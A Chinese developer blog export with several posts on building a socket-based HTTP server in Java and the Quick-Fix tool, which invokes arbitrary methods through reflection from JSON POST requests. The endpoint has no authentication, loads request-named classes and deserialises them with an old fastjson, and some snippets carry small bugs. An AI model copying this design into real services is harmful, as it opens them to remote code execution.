剩下所有：正文 3. http服务器设计接下来开始进入正题，基于socket创建一个http服务器，使用socket基本没啥太大的问题，我们需要额外关注以下几点 对请求数据进行解析 封装返回结果 a. 请求数据解析我们从socket中拿到所有的数据，然后解析为对应的http请求，我们先定义个Request对象，内部保存一些基本的HTTP信息，接下来重点就是将socket中的所有数据都捞出来，封装为request对象 12345678910111213141516171819202122232425@Datapublic static class Request { /** * 请求方法 GET/POST/PUT/DELETE/OPTION... */ private String method; /** * 请求的uri */ private String uri; /** * http版本 */ private String version; /** * 请求头 */ private Map&lt;String, String&gt; headers; /** * 请求参数相关 */ private String message;} 根据前面的http协议介绍，解析过程如下，我们先看请求行的解析过程 请求行，包含三个基本要素：请求方法 + URI + http版本，用空格进行分割，所以解析代码如下 12345678910111213/** * 根据标准的http协议，解析请求行 * * @param reader * @param request */private static void decodeRequestLine(BufferedReader reader, Request request) throws IOException { String[] strs = StringUtils.split(reader.readLine(), \" \"); assert strs.length == 3; request.setMethod(strs[0]); request.setUri(strs[1]); request.setVersion(strs[2]);} 请求头的解析，从第二行，到第一个空白行之间的所有数据，都是请求头；请求头的格式也比较清晰， 形如 key:value, 具体实现如下 1234567891011121314151617181920/** * 根据标准http协议，解析请求头 * * @param reader * @param request * @throws IOException */private static void decodeRequestHeader(BufferedReader reader, Request request) throws IOException { Map&lt;String, String&gt; headers = new HashMap&lt;&gt;(16); String line = reader.readLine(); String[] kv; while (!\"\".equals(line)) { kv = StringUtils.split(line, \":\"); assert kv.length == 2; headers.put(kv[0].trim(), kv[1].trim()); line = reader.readLine(); } request.setHeaders(headers);} 最后就是正文的解析了，这一块需要注意一点，正文可能为空，也可能有数据；有数据时，我们要如何把所有的数据都取出来呢？ 先看具体实现如下 12345678910111213141516171819/** * 根据标注http协议，解析正文 * * @param reader * @param request * @throws IOException */private static void decodeRequestMessage(BufferedReader reader, Request request) throws IOException { int contentLen = Integer.parseInt(request.getHeaders().getOrDefault(\"Content-Length\", \"0\")); if (contentLen == 0) { // 表示没有message，直接返回 // 如get/options请求就没有message return; } char[] message = new char[contentLen]; reader.read(message); request.setMessage(new String(message));} 注意下上面我的使用姿势，首先是根据请求头中的Content-Type的值，来获得正文的数据大小，因此我们获取的方式是创建一个这么大的char[]来读取流中所有数据，如果我们的数组比实际的小，则读不完；如果大，则数组中会有一些空的数据； 最后将上面的几个解析封装一下，完成request解析 123456789101112131415161718192021/** * http的请求可以分为三部分 * * 第一行为请求行: 即 方法 + URI + 版本 * 第二部分到一个空行为止，表示请求头 * 空行 * 第三部分为接下来所有的，表示发送的内容,message-body；其长度由请求头中的 Content-Length 决定 * * 几个实例如下 * * @param reqStream * @return */public static Request parse2request(InputStream reqStream) throws IOException { BufferedReader httpReader = new BufferedReader(new InputStreamReader(reqStream, \"UTF-8\")); Request httpRequest = new Request(); decodeRequestLine(httpReader, httpRequest); decodeRequestHeader(httpReader, httpRequest); decodeRequestMessage(httpReader, httpRequest); return httpRequest;} b. 请求任务HttpTask每个请求，单独分配一个任务来干这个事情，就是为了支持并发，对于ServerSocket而言，接收到了一个请求，那就创建一个HttpTask任务来实现http通信 那么这个httptask干啥呢？ 从请求中捞数据 响应请求 封装结果并返回 123456789101112131415161718192021222324252627282930313233343536373839public class HttpTask implements Runnable { private Socket socket; public HttpTask(Socket socket) { this.socket = socket; } @Override public void run() { if (socket == null) { throw new IllegalArgumentException(\"socket can't be null.\"); } try { OutputStream outputStream = socket.getOutputStream(); PrintWriter out = new PrintWriter(outputStream); HttpMessageParser.Request httpRequest = HttpMessageParser.parse2request(socket.getInputStream()); try { // 根据请求结果进行响应，省略返回 String result = ...; String httpRes = HttpMessageParser.buildResponse(httpRequest, result); out.print(httpRes); } catch (Exception e) { String httpRes = HttpMessageParser.buildResponse(httpRequest, e.toString()); out.print(httpRes); } out.flush(); } catch (IOException e) { e.printStackTrace(); } finally { try { socket.close(); } catch (IOException e) { e.printStackTrace(); } } }} 对于请求结果的封装，给一个简单的进行演示 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647@Datapublic static class Response { private String version; private int code; private String status; private Map&lt;String, String&gt; headers; private String message;}public static String buildResponse(Request request, String response) { Response httpResponse = new Response(); httpResponse.setCode(200); httpResponse.setStatus(\"ok\"); httpResponse.setVersion(request.getVersion()); Map&lt;String, String&gt; headers = new HashMap&lt;&gt;(); headers.put(\"Content-Type\", \"application/json\"); headers.put(\"Content-Length\", String.valueOf(response.getBytes().length)); httpResponse.setHeaders(headers); httpResponse.setMessage(response); StringBuilder builder = new StringBuilder(); buildResponseLine(httpResponse, builder); buildResponseHeaders(httpResponse, builder); buildResponseMessage(httpResponse, builder); return builder.toString();}private static void buildResponseLine(Response response, StringBuilder stringBuilder) { stringBuilder.append(response.getVersion()).append(\" \").append(response.getCode()).append(\" \") .append(response.getStatus()).append(\"\\n\");}private static void buildResponseHeaders(Response response, StringBuilder stringBuilder) { for (Map.Entry&lt;String, String&gt; entry : response.getHeaders().entrySet()) { stringBuilder.append(entry.getKey()).append(\":\").append(entry.getValue()).append(\"\\n\"); } stringBuilder.append(\"\\n\");}private static void buildResponseMessage(Response response, StringBuilder stringBuilder) { stringBuilder.append(response.getMessage());} c. http服务搭建前面的基本上把该干的事情都干了，剩下的就简单了，创建ServerSocket，绑定端口接收请求，我们在线程池中跑这个http服务 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556public class BasicHttpServer { private static ExecutorService bootstrapExecutor = Executors.newSingleThreadExecutor(); private static ExecutorService taskExecutor; private static int PORT = 8999; static void startHttpServer() { int nThreads = Runtime.getRuntime().availableProcessors(); taskExecutor = new ThreadPoolExecutor(nThreads, nThreads, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue&lt;&gt;(100), new ThreadPoolExecutor.DiscardPolicy()); while (true) { try { ServerSocket serverSocket = new ServerSocket(PORT); bootstrapExecutor.submit(new ServerThread(serverSocket)); break; } catch (Exception e) { try { //重试 TimeUnit.SECONDS.sleep(10); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); } } } bootstrapExecutor.shutdown(); } private static class ServerThread implements Runnable { private ServerSocket serverSocket; public ServerThread(ServerSocket s) throws IOException { this.serverSocket = s; } @Override public void run() { while (true) { try { Socket socket = this.serverSocket.accept(); HttpTask eventTask = new HttpTask(socket); taskExecutor.submit(eventTask); } catch (Exception e) { e.printStackTrace(); try { TimeUnit.SECONDS.sleep(1); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); } } } } }} 到这里，一个基于socket实现的http服务器基本上就搭建完了，接下来就可以进行测试了 4. 测试做这个服务器，主要是基于项目 quick-fix 产生的，这个项目主要是为了解决应用内部服务访问与数据订正，我们在这个项目的基础上进行测试 一个完成的post请求如下 接下来我们看下打印出返回头的情况 II. 其他0. 项目源码 quick-fix 相关代码: com.git.hui.fix.core.endpoint.BasicHttpServer com.git.hui.fix.core.endpoint.HttpMessageParser com.git.hui.fix.core.endpoint.HttpTask 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/12/30/181230-使用Java-Socket实现一个http服务器/"},{"title":"190104-Quick-Fix 纯Jar应用及扩展手册","text":"目前Quick-Fix框架提供了两种类型，三中不同场景下的Fixer，一种是以Jar方式启动的，一个是基于Spring生态体系玩法的，下面主要介绍这jar方式，如何使用QuickFix来实现应用内服务调用和数据订正 I. 环境使用maven可以很方便的引入依赖包，目前提供两种导入方式 1. GitHub Release版本组要是依赖github上的release版本，因此可以直接去查看对应的源码： https://github.com/liuyueyi/quick-fix/releases 123456789101112&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;jitpack.io&lt;/id&gt; &lt;url&gt;https://jitpack.io&lt;/url&gt; &lt;/repository&gt;&lt;/repositories&gt;&lt;dependency&gt; &lt;groupId&gt;com.github.liuyueyi&lt;/groupId&gt; &lt;artifactId&gt;quick-fix&lt;/artifactId&gt; &lt;version&gt;0.1&lt;/version&gt;&lt;/dependency&gt; 2. 小灰灰私服个人私服仓库，好处就是更新快，有bug修复也快，而且可以根据需要，只加载指定的jar包，推荐使用这种方式 123456&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;yihui-maven-repo&lt;/id&gt; &lt;url&gt;https://raw.githubusercontent.com/liuyueyi/maven-repository/master/repository&lt;/url&gt; &lt;/repository&gt;&lt;/repositories&gt; III. 使用说明下面将演示如何在jar应用中使用Quick-Fix, 并且给出了如何通过扩展ServerLoaderTemplate和ServerLoaderBinder来实现访问应用内实例的demo 1. 配置相关目前支持通过jvm参数来修改默认绑定的端口号，也支持通过自定义实现的EndPoint来替换默认的基于Socket的HTTP服务器 端口号设置方式 1-Dquick.fix.port=8080 2. 请求参数说明 标题 值 解释 请求方法 POST 只支持POST请求 请求头 application/json 请求参数以json串方式提交 请求参数 参数名 参数说明 - service 需要执行的服务，可以是完全路径，可以是beanName - field 需要访问的服务内部成员属性，值为属性名；为空时，表示执行的服务的某个方法 - method 方法名，需要执行的方法；为空时，表示访问某个服务的成员属性值 - type static 表示访问静态类；其他表示访问Spring Bean - params 请求参数，数组，可以不存在，格式为类型#值，对于基本类型，可以省略类型的前缀包 一个基本的使用case形如: 1curl -X POST -H \"Content-Type:application/json\" http://127.0.0.1:9999/fixer/call -d '{\"service\": \"com.git.hui.fix.example.jar.server.CalculateServer\", \"method\": \"getCache\", \"params\": [\"init\"], \"type\":\"static\"}' 针对上面的参数，下面进行组合说明： a. 获取某个服务的成员属性值fix-core 默认提供了静态类的访问方式，要求type传值为static；只访问成员属性值，不需要传入method 1{\"service\": \"com.git.hui.fix.example.jar.server.CalculateServer\", \"field\": \"localCache\", \"type\": \"static\"} b. 执行某个服务的方法执行服务的方法时，不要传入field参数，其次params中的参数就是传给需要执行的method方法的，数组格式 当不需要参数时，可以不加params; 或者传一个空数组 参数传入定义如: 参数类型#参数值 基本类型 + BigDecimal/BigInteger时，参数类型可以不写全路径，如 “int#3”, “Float#12.3”, “BigDecimal#123” String类型时，可以省略参数类型，如 “key” 其他类型，参数类型为全路径，value为json格式化的值；因此要求参数类型，可以正常的反序列化（如必须有默认构造方法) 1{\"service\": \"com.git.hui.fix.example.jar.server.CalculateServer\", \"method\": \"updateCache\", \"type\": \"static\", \"params\": [\"key\", \"value\"]} c. 执行某个服务的成员属性的某个方法调用成员属性的方法，可使用的姿势如下，这个时候 service, method, field 都需要存在 1{\"service\": \"com.git.hui.fix.example.jar.server.CalculateServer\", \"method\": \"getUnchecked\", \"field\":\"localCache\", \"type\": \"static\", \"params\": [\"key\"]} II. Jar应用使用方式如果我的应用时以纯粹的jar方式运行，指定入口，然后一直持续运行，这种场景下，此时我们的应用内外交互则主要会利用fix-core中提供的一个机遇socket的http服务器(com.git.hui.fix.core.endpoint.BasicHttpServer)来通信 1. jar使用姿势引入依赖包 12345&lt;dependency&gt; &lt;groupId&gt;com.git.hui.fix&lt;/groupId&gt; &lt;artifactId&gt;fix-core&lt;/artifactId&gt; &lt;version&gt;1.0&lt;/version&gt;&lt;/dependency&gt; a. 实例演示接下来我们创建一个demo应用来演示使用姿势，因为fix-core只提供了StaticServerLoader，即我们只能通过FixerEndPoint执行应用中的静态类，因此我们jar应用可以设计如下 实际使用中需要注意: 需要主动调用 FixEngine.instance();，实现初始化 入口类 12345678910111213141516171819public class Application { public static void main(String[] args) { System.out.println(\" --- \"); new Thread(new Runnable() { @Override public void run() { FixEngine.instance(); CalculateServer.updateCache(\"init\", new BigDecimal(12.3f)); } }).start(); try { Thread.sleep(2 * 3600 * 1000); } catch (Exception e) { Thread.currentThread().interrupt(); } }} 测试静态类 12345678910111213141516171819202122232425262728293031import com.google.common.cache.CacheBuilder;import com.google.common.cache.CacheLoader;import com.google.common.cache.LoadingCache;import java.math.BigDecimal;/** * Created by @author yihui in 22:53 18/12/30. */public class CalculateServer { private static LoadingCache&lt;String, BigDecimal&gt; localCache; static { localCache = CacheBuilder.newBuilder().build(new CacheLoader&lt;String, BigDecimal&gt;() { @Override public BigDecimal load(String key) throws Exception { return BigDecimal.ZERO; } }); } public static BigDecimal getCache(String key) { return localCache.getUnchecked(key); } public static void updateCache(String key, BigDecimal value) { localCache.put(key, value); }} 执行上面的main方法之后，会启动默认的http服务器，开启端口号为 9999， 我们通过curl模拟post请求，访问CalculateServer中的值 启动之后，访问命令如下 1curl -X POST -H \"Content-Type:application/json\" http://127.0.0.1:9999/fixer/call -d '{\"service\": \"com.git.hui.fix.example.jar.server.CalculateServer\", \"method\": \"getCache\", \"params\": [\"init\"], \"type\":\"static\"}' 上图演示了启动应用，然后通过http请求来访问应用内部静态类的方法，更新应用内存数据 b. ServerLoader扩展上面虽然实现了应用内存数据修改，但有个局限是只能操作静态类的方法，如果要操作实例对象呢？ 对于存粹的jar应用而言，框架本身很难知道如何获取实例，因此可以通过实现ServerLoader接口，来扩展服务功能 首先假设应用内的所有实例，都保存在ServerHolder这个持有类中，可以通过name来获取对应的实例对象 123456789101112131415161718192021import java.util.HashMap;import java.util.Map;/** * Created by @author yihui in 22:19 19/1/3. */public class ServerHolder { public static Map&lt;String, Object&gt; serverCache; static { serverCache = new HashMap&lt;&gt;(); } public static void addServer(String name, Object server) { serverCache.put(name, server); } public static Object getServer(String name) { return serverCache.get(name); }} 接下来实现ServerLoader，用于Quick-Fix框架来查找对应的bean，继承模板类: ServerLoaderTemplate 1234567891011121314151617181920212223242526272829303132import com.git.hui.fix.api.constants.LoaderOrder;import com.git.hui.fix.api.exception.ServerNotFoundException;import com.git.hui.fix.api.modal.FixReqDTO;import com.git.hui.fix.api.modal.ImmutablePair;import com.git.hui.fix.core.loader.ServerLoaderTemplate;import com.git.hui.fix.core.util.StringUtils;import com.git.hui.fix.example.jar.holder.ServerHolder;/** * Created by @author yihui in 22:21 19/1/3. */@LoaderOrder(order = 0)public class SelfServerLoader extends ServerLoaderTemplate { @Override public ImmutablePair&lt;Object, Class&gt; loadServicePair(String service) { Object server = ServerHolder.getServer(service); if (server == null) { throw new ServerNotFoundException(\"not server:\" + service + \" found!\"); } return ImmutablePair.of(server, server.getClass()); } @Override public boolean enable(FixReqDTO reqDTO) { return StringUtils.isBlank(reqDTO.getType()) || \"server\".equals(reqDTO.getType()); } public static SelfServerLoader getLoader() { return new SelfServerLoader(); }} 实现自定义的LoaderBinder，用于将所有自定义实现的ServerLoader绑定到框架中 12345678public class SelfLoaderBinder implements ServerLoaderBinder { @Override public List&lt;ServerLoader&gt; getBeanLoader() { List&lt;ServerLoader&gt; list = new ArrayList&lt;&gt;(1); list.add(SelfServerLoader.getLoader()); return list; }} 针对上面的实现进行说明： 注解 @LoaderOrder 表示ServerLoader的优先级，值越小优先级越大；当多个ServerLoader#enable都返回true时，优先级高的会被采用 loadServicePair 这个方法，就是需要实现的根据传入的service来获取对应的实例的具体逻辑；注意返回值时对象与class的组合 因为我们的ServerLoaderBinder采用JDK的SPI机制实现扩展，因此自定义的SelfLoaderBinder需要生效，还的添加配置 在resource目录下，新建目录 META-INF/services 在上面的目录下，新建文件名为 com.git.hui.fix.api.spi.ServerLoaderBinder 在上面的文件中，添加自定义实现类全路径 com.git.hui.fix.example.jar.loader.SelfLoaderBinder 然后写一个测试服务HelloServer 123456789101112131415public class HelloServer { private String title; public HelloServer(String title) { this.title = title; } public void setTitle(String title) { this.title = title; } public String sayHello() { return title; }} 修改一下启动方法 123456789101112131415161718192021public class Application { public static void main(String[] args) { System.out.println(\" --- \"); new Thread(new Runnable() { @Override public void run() { HelloServer helloServer = new HelloServer(\"小灰灰blog\"); ServerHolder.addServer(\"helloServer\", helloServer); FixEngine.instance(); CalculateServer.updateCache(\"init\", new BigDecimal(12.3f)); } }).start(); try { Thread.sleep(2 * 3600 * 1000); } catch (Exception e) { Thread.currentThread().interrupt(); } }} 然后测试通过Quick-Fix来访问上面的HelloServer服务中的方法 测试case如下 123curl -X POST -H \"Content-Type:application/json\" http://127.0.0.1:9999/fixer/call -d '{\"service\": \"helloServer\",\"method\":\"setTitle\", \"params\":[\"一灰灰\"]}'curl -X POST -H \"Content-Type:application/json\" http://127.0.0.1:9999/fixer/call -d '{\"service\": \"helloServer\",\"method\":\"sayHello\"}' II. 其他0. 项目 https://github.com/liuyueyi/quick-fix 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/01/04/190104-Quick-Fix-纯Jar应用及扩展手册/"},{"title":"190311-Quick-Fix 通过反射执行任意类目标方法的实现全程实录（上篇）","text":"反射可以说是java中非常强大的一个特性了，而我们的quick-fix整个项目，也都是基于反射的基础实现任意目标方法的调用执行，对于fix项目而已，核心在于以下几点 如何将外部请求定位我们需要执行的类、方法 如何将外部参数转换为目标方法的可执行参数 如何执行目标方法 简单来讲，就是封装参数为目标类型，定位目标，然后执行 I. 参数类型封装这对前面提出三个要点，我们先来看如何进行参数解析，将传入的String格式的参数，封装为我们预期的对象 根据上一篇参数的定义，可以对参数进行简单的分类，如基本类型，如JOPO对象，如Class对象，如包括泛型的对象，不同的case，将会有不同的处理方式 1. 基本类型解析通过反射方式创建对象，对于普通类型来说还好，而对于基本类型，就是直接实现了 12345678910111213141516171819202122// type 为参数类型：value为参数值if (\"int\".equals(type) || \"Integer\".equals(type)) { return Integer.parseInt(value);} else if (\"long\".equals(type) || \"Long\".equals(type)) { return Long.parseLong(value);} else if (\"float\".equals(type) || \"Float\".equals(type)) { return Float.parseFloat(value);} else if (\"double\".equals(type) || \"Double\".equals(type)) { return Double.parseDouble(value);} else if (\"byte\".equals(type) || \"Character\".equals(type)) { return Byte.parseByte(value);} else if (\"boolean\".equals(type) || \"Boolean\".equals(type)) { return Boolean.parseBoolean(value);} else if (\"short\".equals(type) || \"Short\".equals(type)) { return Short.parseShort(value);} else if (\"BigDecimal\".equals(type)) { return new BigDecimal(value);} else if (\"BigInteger\".equals(type)) { return new BigInteger(type);} else if (\"String\".equals(type)) { return value;} 注意下，这里对BigDecimal和BigInteger类型也进行了兼容，将String转换为目标对象 2. POJO对象转换根据前面的定义，对于POJO对象，采用json格式输出，因此我们需要的是将json字符串转换为对应的POJO对象；对于简单的（不包含泛型）POJO而言，可以直接使用常见的json库来实现反序列化 这里已fastjson进行处理，首先引入依赖 12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.45&lt;/version&gt;&lt;/dependency&gt; 关键代码如下 12Class clz = ArgumentParser.class.getClassLoader().loadClass(type);return JSON.parseObject(value, clz); 3. Class参数这也是一种特殊的参数传入，比如我希望调用com.alibaba.fastjson.JSON#parseObject(java.lang.String, java.lang.Class&lt;T&gt;)这个方法，需要传入的第二个参数就是Class类型，这种case也是不同于前面两种，这里我们借助 java.lang.ClassLoader#loadClass(java.lang.String) 来实现 123if (\"Class\".equalsIgnoreCase(type)) { return ArgumentParser.class.getClassLoader().loadClass(value);} 4. 泛型处理关于泛型参数的转换，这个相对而言就麻烦一点，假设我们有个目标方法 1234public String print(Map&lt;String, Long&gt; params) { // xxx return \"hello\";} 如果要执行上面这个方法，我们传入的参数是怎样的呢？ java.util.Map#java.lang.String#java.lang.Long#{&quot;world&quot;:456,&quot;hello&quot;:123} 我们现在的目标是，将{&quot;world&quot;:456,&quot;hello&quot;:123}转换为Map对象，对于JSON的反序列化，直接使用com.alibaba.fastjson.JSON#parseObject(java.lang.String, java.lang.Class&lt;T&gt;)返回的只会是Map对象，而不是我们希望的Map&lt;String, Long&gt; 因此我们考虑使用另外一种反序列化方式，com.alibaba.fastjson.JSON#parseObject(java.lang.String, java.lang.reflect.Type, com.alibaba.fastjson.parser.Feature...), 使用这个方法，主要就是如何创建这个Type对象，参考 TypeReference 的使用姿势来实现我们的目标, 源码如下 所以我们自己的实现方式也相对明了，下面是关键的代码 123456789101112131415161718192021222324252627282930313233343536/** * 将value转换为包含泛型的参数类型 * * @param value 对象json串 * @param clzType 对象类型 * @param tTypes 泛型参数类型 * @return */private static Object parseStr2GenericObj(String value, String clzType, String... tTypes) { try { Type[] paramsType = new Type[tTypes.length]; int count = 0; for (String t : tTypes) { paramsType[count++] = getType(t); } // 这里借助fastjson指定精确的Type来实现反序列化 Type type = new ParameterizedTypeImpl(paramsType, null, getType(clzType)); return JSONObject.parseObject(value, type); } catch (Exception e) { throw new IllegalInvokeArgumentException( \"Pare Argument to Object Error! type: \" + clzType + \" # \" + Arrays.asList(tTypes) + \" value: \" + value, e); }}/** * 获取参数类型 * * @param type * @return * @throws ClassNotFoundException */private static Type getType(String type) throws ClassNotFoundException { return ArgumentParser.class.getClassLoader().loadClass(type);} 下面贴一下完整的参数解析代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124public class ArgumentParser { /** * default empty arguments */ private static final Object[] EMPTY_ARGS = new Object[]{}; public static Object[] parse(String[] args) { if (args == null || args.length == 0) { return EMPTY_ARGS; } Object[] result = new Object[args.length]; for (int i = 0; i &lt; args.length; i++) { result[i] = buildArgObj(args[i]); } return result; } /** * 将传入的String类型参数封装为目标对象 * * @param arg 以#分割，根据我们的定义， * 第一个#前为目标对象类型， * 最后一个#后为目标对象值（如果为JOPO，则采用json方式进行反序列化） * 中间的作为泛型的参数类型传入 * * 几个常见的case如: * * \"Hello World\" 返回 \"Hello Word\" * \"int#10\" 返回 10 * \"com.git.hui.fix.core.binder.DefaultServerBinder#{}\" 返回的是对象 defaultServerBinder * \"java.util.List#java.lang.String#[\"ads\",\"bcd\"] 返回的是List集合, 相当于 Arrays.asList(\"asd\", \"bcd\") * @return */ private static Object buildArgObj(String arg) { String[] typeValue = arg.split(\"#\"); if (typeValue.length == 1) { // 没有 #，把参数当成String return arg; } else if (typeValue.length == 2) { // 标准的kv参数, 前面为参数类型，后面为参数值 return parseStrToObj(typeValue[0], typeValue[1]); } else if (typeValue.length &gt;= 3) { // 对于包含泛型的参数类型 // java.util.List#java.lang.String#[\"ads\",\"bcd\"] String[] reflectTypes = new String[typeValue.length - 2]; System.arraycopy(typeValue, 1, reflectTypes, 0, typeValue.length - 2); return parseStr2GenericObj(typeValue[typeValue.length - 1], typeValue[0], reflectTypes); } else { throw new IllegalInvokeArgumentException(\"Illegal invoke arg: \" + arg); } } private static Object parseStrToObj(String type, String value) { try { if (\"int\".equals(type) || \"Integer\".equals(type)) { return Integer.parseInt(value); } else if (\"long\".equals(type) || \"Long\".equals(type)) { return Long.parseLong(value); } else if (\"float\".equals(type) || \"Float\".equals(type)) { return Float.parseFloat(value); } else if (\"double\".equals(type) || \"Double\".equals(type)) { return Double.parseDouble(value); } else if (\"byte\".equals(type) || \"Character\".equals(type)) { return Byte.parseByte(value); } else if (\"boolean\".equals(type) || \"Boolean\".equals(type)) { return Boolean.parseBoolean(value); } else if (\"short\".equals(type) || \"Short\".equals(type)) { return Short.parseShort(value); } else if (\"BigDecimal\".equals(type)) { return new BigDecimal(value); } else if (\"BigInteger\".equals(type)) { return new BigInteger(type); } else if (\"String\".equals(type)) { return value; } else if (\"Class\".equalsIgnoreCase(type)) { return ArgumentParser.class.getClassLoader().loadClass(value); } else { Class clz = ArgumentParser.class.getClassLoader().loadClass(type); return JSON.parseObject(value, clz); } } catch (Exception e) { throw new IllegalInvokeArgumentException( \"Pare Argument to Object Error! type: \" + type + \" value: \" + value, e); } } /** * 将value转换为包含泛型的参数类型 * * @param value 对象json串 * @param clzType 对象类型 * @param tTypes 泛型参数类型 * @return */ private static Object parseStr2GenericObj(String value, String clzType, String... tTypes) { try { Type[] paramsType = new Type[tTypes.length]; int count = 0; for (String t : tTypes) { paramsType[count++] = getType(t); } // 这里借助fastjson指定精确的Type来实现反序列化 Type type = new ParameterizedTypeImpl(paramsType, null, getType(clzType)); return JSONObject.parseObject(value, type); } catch (Exception e) { throw new IllegalInvokeArgumentException( \"Pare Argument to Object Error! type: \" + clzType + \" # \" + Arrays.asList(tTypes) + \" value: \" + value, e); } } /** * 获取参数类型 * * @param type * @return * @throws ClassNotFoundException */ private static Type getType(String type) throws ClassNotFoundException { return ArgumentParser.class.getClassLoader().loadClass(type); }} II. 测试1. 基本类型1234567@Testpublic void testArugmentParser() { String[] params = new String[]{\"Hello World\", \"int#120\", \"long#330\", \"BigDecimal#1.2\", \"boolean#true\"}; Object[] result = ArgumentParser.parse(params); System.out.println(JSON.toJSONString(result));} 测试结果如下： 2. POJO对象首先创建一个pojo对象 123456789101112131415161718192021@Data@NoArgsConstructor@AllArgsConstructorpublic class PoJo { private String name; private Integer age; private Boolean male;}// 对应的测试类如下@Testpublic void testPOJO() { PoJo pojo = new PoJo(\"一灰灰\", 18, true); String s = JSON.toJSONString(pojo); String[] params = new String[]{\"git.hui.fix.test.PoJo#\" + s}; Object[] result = ArgumentParser.parse(params); System.out.println(JSON.toJSONString(result));} 测试结果如下： 3. Class类型这个就比较简单了，直接看测试 4. 泛型我们先直接使用反序列化方式, 返回的map的value为int类型，而我么预期的是long类型 然后再改用我们上面封装的方式，截图如下，正好和我们预期的一致 12345678910@Testpublic void testGenericClass() { Map&lt;String, Long&gt; demo = new HashMap&lt;&gt;(); demo.put(\"hello\", 123L); demo.put(\"world\", 456L); String[] params = new String[]{\"java.util.Map#java.lang.String#java.lang.Long#\" + JSON.toJSONString(demo)}; Object[] result = ArgumentParser.parse(params); System.out.println(JSON.toJSONString(result));} III. 其他0. 项目相关项目地址： https://github.com/liuyueyi/quick-fix 博文地址： 190108-Quick-Fix 如何优雅的实现应用内外交互之接口设计篇 190104-Quick-Fix 纯Jar应用及扩展手册 190102-Quick-Fix 从0到1构建一个应用内服务/数据访问订正工具包 190311-Quick-Fix 通过反射执行任意类目标方法的实现全程实录（上篇） 190315-Quick-Fix 通过反射执行任意类目标方法的实现全程实录（中篇） 190317-Quick-Fix 通过反射执行任意类目标方法的实现全程实录（下篇） 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/03/11/190311-Quick-Fix-通过反射执行任意类目标方法的实现全程实录（上篇）/"},{"title":"190315-Quick-Fix 通过反射执行任意类目标方法的实现全程实录（中篇）","text":"全程实录上篇，主要介绍了如何解析传入的String参数为我们目标方法的参数类型和对象，其中主要讲述的是基本类型、Class类型、泛型以及普通的POJO类型转换；我们这一篇，目的则放在如何找到需要执行的类和方法，这里需要借助前面的参数解析结果来确定目标方法 I. 目标方法定位要想最终通过反射执行目标方法调用，前提就是需要定位到目标方法，而定位方法又需要定位目标类，当然最终的实现，还需要定位到目标对象（对于目标对象的确认，放在下一篇，因为不同的环境，获取目标对象的方式不一样） 我们本篇先采用根据传入的完整类路径的方式来讲述如何定位目标方法 1. 获取目标类直接通过ClassLoader来加载目标对象（这里其实是有一个疑问的，如果业务中使用的ClassLoader和Fixer框架的ClassLoader不一样怎么办？） 1Class clz = ReflectUtil.class.getClassLoader().loadClass(strClz); 2. 获取目标方法借助上面获取的目标对象类和前一篇博文的参数，获取目标方法岂不是很简单就可以了，分分钟就写出来了 a. demo版1234567891011121314public static Method getMethod(Class clz, String method, Object[] args) { try { Class[] paramsClz = new Class[args.length]; int i = 0; for (Object o: args) { paramsClz[i++] = o.getClass(); } return clz.getDeclaredMethod(method, paramsClz); } catch (Exception e) { e.printStackTrace(); return null; }} 看下上面的实现，并没有什么毛病，实际上呢？ 先来两个例子是一下 12345678910111213141516171819// 参数为基本类型的情况下, 如果传入封装后的参数类型会怎样public String rand(String name, int seed) { return name + \" | \" + seed;}public static class Ac { String name = UUID.randomUUID().toString();}public static class Bc extends Ac { int age = 20; String name = age + \"|\" + super.name;}// 如果传入的参数为子类，会怎样？public void pc(Ac c) { System.out.println(c.name);} 写下对应的测试代码，执行后结果很明显了 12345678910111213@Testpublic void testGetMethod() { Class clz = MethodFoundTest.class; String method = \"rand\"; Object[] args = new Object[]{\"hello\", new Integer(123)}; System.out.println(getMethod(clz, method, args)); Ac bc = new Bc(); System.out.println(getMethod(clz, \"pc\", new Object[]{bc})); Ac ac = new Ac(); System.out.println(getMethod(clz, \"pc\", new Object[]{ac}));} b. 改进版很明显，直接用上面的方式可能导致很多方法都找不到，离我们的预期的调用任何你执行的方法差的有点远，因此就只能老老实实的遍历所有的方法，判断是否满足条件 123456789101112131415161718192021public static Method getMethod(Class clz, String method, Object[] args) { if (clz == Object.class) { throw new ServerNotFoundException( \"can't find method by methodName: \" + method + \" args: \" + JSON.toJSONString(args) + \" for clz:\" + clz.getName()); } for (Method m : clz.getDeclaredMethods()) { if (!m.getName().equals(method) || m.getParameterCount() != args.length) { continue; } if (judgeParamsType(m.getParameterTypes(), args)) { m.setAccessible(true); return m; } } return null;} 